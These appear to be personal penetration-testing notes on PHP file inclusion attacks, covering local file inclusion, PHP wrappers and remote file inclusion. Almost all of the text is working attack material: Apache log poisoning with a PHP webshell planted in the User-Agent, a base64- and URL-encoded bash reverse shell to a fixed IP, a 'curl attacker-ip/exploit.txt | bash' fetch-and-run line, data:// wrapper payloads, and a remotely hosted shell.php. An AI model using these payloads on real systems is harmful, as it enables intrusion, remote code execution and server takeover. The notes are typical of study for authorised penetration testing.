# LFI

Combine Directory Traversal with Local File Inclusion for shell

```
kali@kali:~$ curl http://vulnerable-website/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

will give:

```
192.168.250.1 - - [12/Apr/2022:10:34:55 +0000] "GET /index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

So note the user agent is added. This is usally if the 'combined' log setting is in the apache2.conf log setting.

So lets add a webshell into our user agent

```
<?php echo system($_GET['cmd']); ?>
```

```
GET /index.php?page=admin.php HTTP/1.1
Host: vulnerable-website
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

NB: only seed this webshell once, otherwise there will be multiple instances of the webshell!

Then to trigger it: 

```
kali@kali:~$ curl http://vulnerable-website/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id
```

will send the cmd parameter to the php webshell which in this case is `id` so the response should be included in the log

now we can setup a reverse shell with the following

send this reverse shell command into base64

```
kali@kali:~$ echo -n 'bash -c "bash -i >& /dev/tcp/192.168.240.7/443 0>&1"' | base64

YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MC43LzQ0MyAwPiYxIg==
```

now if you have to url encode it as the command:
```
echo -n YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MC43LzQ0MyAwPiYxIg== | base64 -d | bash
```

which can be done by going to [https://gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)

you get url encoded and special characters encoded as

```
echo%20%2Dn%20YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjI0MC43LzQ0MyAwPiYxIg%3D%3D%20%7C%20base64%20%2Dd%20%7C%20bash
```

so to trigger the payload do the following

```
kali@kali:~$ curl http://vulnerable-website/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=echo%20%2Dn%20YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjI0MC43LzQ0MyAwPiYxIg%3D%3D%20%7C%20base64%20%2Dd%20%7C%20bash
```

another way is to use the command and have that encoded into url encoded.

```
kali@kali:~$ curl http://attacker-ip/exploit.txt | bash
```

# PHP Wrappers

`php://filter/resource` for no filter file inclusion

```
kali@kali:~$ curl http://vulnerable-website/index.php?page=php://filter/resource=admin.php
```

`php://filter/convert.base64-encode/resource=admin.php` for base64 filter file inclusion

```
kali@kali:~$ curl http://vulnerable-website/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

`data://test/plain,<?php%20echo%20system('ls');?>` for php input in the same command

```
kali@kali:~$ curl "http://vulnerable-website/index.php?page=data://test/plain,<?php%20echo%20system('ls');?>"
```

or convert it to base64 and tell it to decode it as base64

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

then

```
kali@kali:~$ curl "http://vulnerable-website/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

and of course you should be able to get a shell out of that as well.

# RFI

Remote file Inclusion

say you have a php file called `shell.php` which contains `<?php echo system($_GET['cmd']); ?>`

host it on a web server and then it could get loaded into the php of the server via the paramater.

```
kali@kali:~$ curl "http://vulnerable-website/index.php?page=http://attacker-ip/shell.php&cmd=ls"
```

this could load the attacker's php into the server as a file include but it's remote as it's coming from your web server.
